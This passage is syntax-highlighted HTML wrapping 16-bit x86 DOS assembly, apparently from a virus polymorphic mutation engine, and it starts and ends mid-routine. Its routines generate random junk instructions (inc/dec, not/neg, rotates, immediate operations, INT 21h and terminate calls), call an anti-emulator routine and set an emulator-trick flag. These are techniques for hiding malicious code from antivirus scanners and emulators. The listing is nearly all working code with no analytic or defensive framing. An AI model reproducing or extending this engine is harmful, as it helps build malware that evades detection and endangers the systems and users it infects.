        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">select_instruction</span><span class="sc0">              </span><span class="sc1">; generate the instuction</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">do_the_random</span><span class="sc0">                   </span><span class="sc1">; with the selected reg.</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">select_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; AH = destination register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">instructions</span><span class="sc0">
</span><span class="sc5">redorndin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">               </span><span class="sc1">; 0Ah basic types of instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">               </span><span class="sc1">; don't eliminate some</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">            </span><span class="sc1">; which instruction will we generate</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_done</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; try to change sometime</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">redorndin</span><span class="sc0">
</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_done</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; store type</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; point to the instr. in the table</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; which instruction</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">foo_label</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">one_byte_instruction</span><span class="sc0">

</span><span class="sc5">foo_label</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_3b</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">three_bytes_instruction</span><span class="sc0">
</span><span class="sc5">no_3b</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; which instruction</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">outta_here</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">foo_label_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">not_nop</span><span class="sc0">
</span><span class="sc5">foo_label_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">outta_here</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rolling</span><span class="sc0">
</span><span class="sc5">outta_here</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">finish_mate</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">calltheran</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                            </span><span class="sc1">; is a compare?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_cmp_check</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; sign it.</span><span class="sc0">
</span><span class="sc5">end_cmp_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">

</span><span class="sc5">finish_mate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; instruction base oc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                 </span><span class="sc1">; op code for reg+instr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">only16</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">         </span><span class="sc1">; reg16 or reg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">only16</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; bytes opcode = word opcode-1</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">only16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                  </span><span class="sc1">; high 8 bits</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_8_bts</span><span class="sc0">
</span><span class="sc5">only16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08bh</span><span class="sc0"> </span><span class="sc1">; only if moving</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">finishing_mate</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ds_mody</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_for_es_change</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">check_for_es_change</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; ds has eq second opcode as bx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_8_bts</span><span class="sc0">
</span><span class="sc5">check_for_es_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">es_mody</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_8_bts</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">end_8_bts</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; es has eq second opcode as ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_8_bts</span><span class="sc0">

</span><span class="sc5">finishing_mate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">end_8_bts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">reg8bits</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gen_mpos</span><span class="sc0">
</span><span class="sc5">end_8_bts</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
</span><span class="sc5">stor_chkjmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">0001</span><span class="sc0">    </span><span class="sc1">; encountered a cmp?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_comparing</span><span class="sc0">                   </span><span class="sc1">; but out of a jmp region?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">jumping_zone</span><span class="sc0">                    </span><span class="sc1">; no, so do one</span><span class="sc0">
</span><span class="sc5">not_comparing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">one_byte_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; dec/inc generation</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                          </span><span class="sc1">; INT 21h generation?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">nocd21</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_int</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_ah_disp</span><span class="sc0">
</span><span class="sc5">nocd21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_ah_disp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_antiemulator</span><span class="sc0">
</span><span class="sc5">no_ah_disp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_away_now</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_cd20</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">only_a_ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20cdh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">stor_n_go</span><span class="sc0">
</span><span class="sc5">only_a_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_exit_put</span><span class="sc0">
</span><span class="sc5">no_cd20</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">with_el</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4cb4h</span><span class="sc0">                        </span><span class="sc1">; mov ah,4ch</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">sto21_n_go</span><span class="sc0">
</span><span class="sc5">with_el</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; random retrun code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                          </span><span class="sc1">; mov ax,4cxxh</span><span class="sc0">
</span><span class="sc5">sto21_n_go</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">21cdh</span><span class="sc0">                        </span><span class="sc1">; int 21h</span><span class="sc0">
</span><span class="sc5">stor_n_go</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">exit_exit_put</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">go_away_now</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">not_nop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc0">                         </span><span class="sc1">; not/neg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; basic opcode</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                           </span><span class="sc1">; register dependant</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">isneg</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; change to not</span><span class="sc0">
</span><span class="sc5">isneg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; max pushes nested</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nopush</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nopush</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dopushpop</span><span class="sc0">                       </span><span class="sc1">; do push</span><span class="sc0">
</span><span class="sc5">nopush</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rolling</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; rol/ror... base oc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_increment</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc5">no_increment</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                 </span><span class="sc1">; the base</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">conv16to8</span><span class="sc0">               </span><span class="sc1">; 8 or 16 bit instruction?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; write the reg/op dipendant byte</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">three_bytes_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;mov reg,immediate</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">doalea</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                    </span><span class="sc1">;mov reg,[imm]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">domemcp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_real_lea</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">                 </span><span class="sc1">; write the fixed first byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">reget</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">         </span><span class="sc1">; select which 3 bytes to do</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_cmp_imm_check</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">end_cmp_imm_check</span><span class="sc0">

</span><span class="sc5">do_compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_compare</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
